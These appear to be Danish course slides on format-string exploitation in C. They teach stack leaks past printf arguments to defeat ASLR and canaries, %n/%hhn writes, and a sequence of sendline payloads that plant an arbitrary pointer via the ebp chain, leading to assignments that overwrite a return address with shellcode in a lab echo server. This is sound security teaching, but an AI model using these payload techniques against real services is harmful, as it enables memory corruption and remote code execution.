Format string
-------------

Format strings bruges til formattering af tekstuel data og findes i mange programmeringssprog.

Et eksempel:

image::../images/printf_stack.png[height=600,float="right"]

[source,c]
------------------------------------------------
char * name = "Robert";
int age = 39;
printf("My name is '%s' and I am %d years old\n", name, age);
------------------------------------------------

Funktioner
----------

printf, fprintf, vprintf, vfprintf, dprintf, sprintf, snprintf, syslog, kprintf....

MANGE!

Variadic function
-----------------

Tager et ikke-fixed antal argumenter.

Funktionen udleder antallet af argumenter fra format strengen.

[source,c]
------------------------------------------------
int printf(const char *format, ...);
------------------------------------------------

Simple format specifiers
------------------------

* %d - Formatterer en integer som decimaltal
* %x - Formatterer en integer som hexadecimaltal
* %f - Formatterer en floating point
* %s - Følger en pointer til en streng

Specificér bredde
-----------------

* %10d - Højrestil med ti pladser, udfyld med mellemrum
* %010d - Højrestil med ti pladser, udfyld med nul
* 0x%08x - Typisk formattering af pointer

Ombyt rækkefølge, gentag, undlad brug
-------------------------------------

* %d/%d %d - Første, anden, tredje
* %3$d - %2$d %2$d - Tredje, anden, anden

F.eks. til europæisk/amerikansk dato formattering.

Virker dog ikke under Windows.

Hvad hvis der indexeres ud over argumenterne?
---------------------------------------------

image::../images/printf_stack.png[height=600,float="right"]

[source,c]
------------------------------------------------
char * name = "Robert";
int age = 39;
printf("Muhahaha %16$08x\n", name, age);
------------------------------------------------

Første opgave - Leak stakken og omgå ASLR/Canaries
--------------------------------------------------

En echo server

[source,c]
------------------------------------------------
include::../assignments/fmt.bug[]
------------------------------------------------

Første opgave - Leak stakken og omgå ASLR/Canaries
--------------------------------------------------

[source,bash]
------------------------------------------------
$ checksec assignments/fmt
[*] '/vagrant/presentations/04-advanced-exploitation/assignments/fmt'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
------------------------------------------------

Første opgave - Leak stakken og omgå ASLR/Canaries
--------------------------------------------------

image::../images/stack_for_leak.png[height=600,float="right"]

Helt præcis find ud af følgende:

* Hvad er værdien af kanarien?
* Hvor er `fmt` programmet indlæst (base addr)?
* Hvad er adressen på bufferen?
* Hvad er adressen på retur adressen?
* Hvad er værdien af vores socket file descriptor?

Andre eksempler på leaks
------------------------

[source,c]
------------------------------------------------
#include <stdio.h>
void how_old() {
    int age;
    printf("Enter your age: ");
    scanf("%d", &age);
}
void leak() {
    char * ptr;
    printf("Have some data: %s\n", ptr);
}
int main(int argc, char ** argv) {
    how_old();
    leak();
    return 0;
}
------------------------------------------------

Andre eksempler på leaks
------------------------

[source,c]
------------------------------------------------
typedef struct {
    time_t birthday;
    char name[256];
    enum { MALE, FEMALE } gender;
} person_t;

void do_stuff(int socket) {
    person_t person;
    person.birthday = time(NULL);
    strcpy(person.name, "Poul");
    person.gender = MALE;
    write(socket, &person, sizeof(person));
}
------------------------------------------------

Andre eksempler på leaks
------------------------

image::../images/heartbleed1.png[height=300]

Andre eksempler på leaks
------------------------

image::../images/heartbleed2.png[height=300]

Andre eksempler på leaks
------------------------

image::../images/heartbleed3.png[height=300]

Andre eksempler på leaks
------------------------

image::../images/heartbleed4.png[height=300]

Andre eksempler på leaks
------------------------

image::../images/heartbleed5.png[height=300]

Andre eksempler på leaks
------------------------

image::../images/heartbleed6.png[height=300]

Andre eksempler på leaks
------------------------

[source,c]
------------------------------------------------
void handle_client(int socket) {
    char buffer[256];
    int bytes;
    if ((bytes = read(socket, buffer, sizeof(buffer) * 2)) > 0) {
        write(socket, "Hello\n", 6);
    }
}
void accept_loop(int server) {
    int client;
    while ((client = accept(server, NULL, NULL)) >= 0) {
        handle_client(client);
        close(client);
    }
    close(server);
}
------------------------------------------------

Leak via ROP (bliver forklaret senere).

Opdatering af variable
----------------------

* %n - Opdater fire byte dword med antallet af udskrevne bytes
* %hn - Opdater to byte word med antallet af udskrevne bytes
* %hhn - Opdater én byte med antallet af udskrevne bytes

[source,c]
------------------------------------------------
#include <stdio.h>
int main(int argc, char ** argv) {
    int i, n;
    printf("Hello %s%n\n", argv[1], &n);
    for (i = 2; i < argc; i++) {
        printf("%*s%s%n\n", n, "", argv[i], &n);
    }
    return 0;
}
------------------------------------------------

Opdatering af variable
----------------------

[source,shell]
------------------------------------------------
$ ./t Robert Chris Bang Larsen
Hello Robert
            Chris
                 Bang
                     Larsen
------------------------------------------------

Opdatering af variable
----------------------

image::../images/write_stack.png[height=600]

Anden opgave - Find tre led i `ebp` kæden
-----------------------------------------

...og lad os da også bare se, at vi kan opdatere en af dem

Find tre led i `ebp` kæden??? WTF??
-----------------------------------

[source,bash]
------------------------------------------------
(gdb) x/xw $ebp
0xffce7748:     0xffce7768
(gdb) x/xw 0xffce7768
0xffce7768:     0xffce7798
(gdb) x/xw 0xffce7798
0xffce7798:     0xffce77d8
------------------------------------------------

Placér arbitrær pointer på stakken
----------------------------------

Inden vi begynder ser `ebp` kæden således ud:

image::../images/arbitrary_pointer_1.png[height=400]

Derefter laver vi en `r.sendline('A' * 0xef + '%145$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0xef + '%145$hhn')`

image::../images/arbitrary_pointer_2.png[height=400]

Derefter laver vi en `r.sendline('A' * 0x99 + '%137$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0x99 + '%137$hhn')`

image::../images/arbitrary_pointer_3.png[height=400]

Derefter laver vi en `r.sendline('A' * 0xbe + '%145$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0xbe + '%145$hhn')`

image::../images/arbitrary_pointer_4.png[height=400]

Derefter laver vi en `r.sendline('A' * 0x9a + '%137$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0x9a + '%137$hhn')`

image::../images/arbitrary_pointer_5.png[height=400]

Derefter laver vi en `r.sendline('A' * 0xad + '%145$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0xad + '%145$hhn')`

image::../images/arbitrary_pointer_6.png[height=400]

Derefter laver vi en `r.sendline('A' * 0x9b + '%137$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0x9b + '%137$hhn')`

image::../images/arbitrary_pointer_7.png[height=400]

Derefter laver vi en `r.sendline('A' * 0xde + '%145$hhn')`

Placér arbitrær pointer på stakken
----------------------------------

Efter `r.sendline('A' * 0xde + '%145$hhn')`

image::../images/arbitrary_pointer_8.png[height=400]

Vi kan nu enten skrive til adressen med `%157$hhn` eller læse fra den med `%157$s`

Tredje opgave - Lav arbitrær pointer i tredje led
-------------------------------------------------

Fjerde opgave - Udbyg med arbitrary write
-----------------------------------------

Exploit ved at overskrive returadressen så vi returnerer til bufferen, som vi selvfølgelig først har fyldt med shellcode.

Optimering af skrivning/læsning
-------------------------------

* Brug `r.sendline('%200x')` istedet for `r.sendline('A' * 200)`
* Opdater kun de dele af pointeren, som har ændret sig
* Indlejr pointeren i format strengen (hvis ikke adressen indeholder ulovlige tegn)
** `r.sendline(flat(0xdeadbeef, '%6$s'))`
* Lav flere skrivninger med samme streng

Leg selv med det
